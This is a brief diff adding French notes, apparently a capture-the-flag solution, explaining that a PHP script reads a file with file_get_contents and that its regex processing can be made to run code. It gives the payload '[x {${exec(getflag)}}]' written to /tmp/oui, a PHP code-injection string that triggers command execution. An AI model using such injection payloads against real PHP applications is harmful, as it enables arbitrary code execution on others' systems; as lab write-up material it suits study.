@@ -1,0 +1,7 @@
+echo '[x {${exec(getflag)}}]' > /tmp/oui
+
+on peu voir que le fichier php prend un fichier en entre avec file_get_contents
+
+il faut se debrouiller avec les regex a fair passer le un exec(getflag) pour avoir le flag
+
+alors il faut fair echo '[x {${exec(getflag)}}]' > /tmp/oui
